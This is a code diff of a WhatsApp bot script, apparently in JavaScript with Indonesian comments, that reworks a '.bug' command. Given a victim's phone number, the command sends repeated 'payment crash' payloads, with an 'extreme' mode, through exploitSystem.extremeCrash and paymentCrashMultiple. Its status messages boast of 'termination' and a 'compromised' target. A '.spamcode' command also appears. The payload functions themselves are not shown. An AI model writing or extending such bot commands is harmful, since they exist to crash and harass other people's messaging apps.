@@ -6085,29 +6085,26 @@ if (text.startsWith('.siapa')) {
 if (text.startsWith('.spamcode')) {
   await spamCode(sock, from, msg, text, isOwner);
 }
-
 // 🎯 FITUR .bug (Payment Crash)
 if (body.startsWith('.bug')) {
     const args = body.trim().split(' ');
     
     if (args.length === 1) {
         await sock.sendMessage(from, { 
-            text: '❌ Format: *.bug 62xxxxxxx*\nContoh: *.bug 6281234567890*\n\nAtau: *.bug 62xxxxxxx 20* (20x)\nAtau: *.bug 62xxxxxxx extreme* (extreme mode)'
+            text: '𝐂𝐎𝐌𝐌𝐀𝐍𝐃: .bug <𝐭𝐚𝐫𝐠𝐞𝐭> [𝐜𝐨𝐮𝐧𝐭]\n\nEXAMPLE:\n.bug 628xxxx\n.bug 628xxxx 15\n.bug 628xxxx 𝐞𝐱𝐭𝐫𝐞𝐦𝐞'
         });
         return;
     }
 
     if (!isOwner(sender)) {
-        await sock.sendMessage(from, { text: '❌ Owner only!' });
+        await sock.sendMessage(from, { text: '𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃' });
         return;
     }
 
     let targetNum = args[1].replace(/[^0-9]/g, '');
     
     if (!targetNum) {
-        await sock.sendMessage(from, {
-            text: '❌ Kasih nomor target!'
-        });
+        await sock.sendMessage(from, { text: '𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐓𝐀𝐑𝐆𝐄𝐓' });
         return;
     }
     
@@ -6116,7 +6113,7 @@ if (body.startsWith('.bug')) {
     
     const targetJid = targetNum + '@s.whatsapp.net';
 
-    // CEK MODE
+    // MODE CHECK
     let mode = "normal";
     let count = 5;
     
@@ -6133,37 +6130,44 @@ if (body.startsWith('.bug')) {
         }
     }
 
-    // EXECUTE
+    // START MESSAGE
     if (mode === "extreme") {
         await sock.sendMessage(from, {
-            text: `☠️ *EXTREME MODE!*\nTarget: ${targetNum}\nPayloads: ${count}x\nStatus: Bombarding with long delays...`
+            text: `𝗘𝗫𝗧𝗥𝗘𝗠𝗘 𝗠𝗢𝗗𝗘 𝗘𝗡𝗚𝗔𝗚𝗘𝗗\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗣𝗔𝗬𝗟𝗢𝗔𝗗𝗦: ${count}\n𝗦𝗧𝗔𝗧𝗨𝗦: 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚...`
         });
-
-        const result = await exploitSystem.extremeCrash(targetJid, count);
-        
-        await sock.sendMessage(from, {
-            text: result.success ? 
-                `💀 *EXTREME COMPLETE!*\nSent: ${result.sent}/${count}\n\n⚠️ WhatsApp target SUSAH dibuka lama!` :
-                `❌ Failed`
-        });
-        
     } else {
         await sock.sendMessage(from, {
-            text: `🚀 Sending ${count}x payment crash to ${targetNum}...`
+            text: `𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗡𝗚 𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗔𝗠𝗢𝗨𝗡𝗧: ${count}x`
         });
+    }
 
-        const result = await exploitSystem.paymentCrashMultiple(targetJid, count);
-        
+    // EXECUTE
+    let result;
+    if (mode === "extreme") {
+        result = await exploitSystem.extremeCrash(targetJid, count);
+    } else {
+        result = await exploitSystem.paymentCrashMultiple(targetJid, count);
+    }
+    
+    // RESULT
+    if (result.success) {
+        if (mode === "extreme") {
+            await sock.sendMessage(from, {
+                text: `𝗧𝗔𝗦𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗦𝗘𝗡𝗧: ${result.sent}/${count}\n𝗦𝗧𝗔𝗧𝗨𝗦: 𝗖𝗢𝗠𝗣𝗥𝗢𝗠𝗜𝗦𝗘𝗗\n\n𝗪𝗔𝗥𝗡𝗜𝗡𝗚: 𝗧𝗔𝗥𝗚𝗘𝗧 𝗦𝗬𝗦𝗧𝗘𝗠 𝗨𝗡𝗦𝗧𝗔𝗕𝗟𝗘`
+            });
+        } else {
+            await sock.sendMessage(from, {
+                text: `𝗘𝗫𝗘𝗖𝗨𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗘𝗙𝗙𝗘𝗖𝗧𝗦: 𝗜𝗠𝗠𝗜𝗡𝗘𝗡𝗧`
+            });
+        }
+    } else {
         await sock.sendMessage(from, {
-            text: result.success ? 
-                `✅ Done! ${result.sent}/${count} sent to ${targetNum}` :
-                `❌ Failed`
+            text: `𝗙𝗔𝗜𝗟𝗨𝗥𝗘\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗦𝗧𝗔𝗧𝗨𝗦: 𝗨𝗡𝗔𝗙𝗙𝗘𝗖𝗧𝗘𝗗`
         });
     }
     
     return;
 }
-
 // 📝 SET NAMA GRUP – Semua member bisa
 if (text.startsWith('.setnamagc')) {
     if (!from.endsWith('@g.us')) {
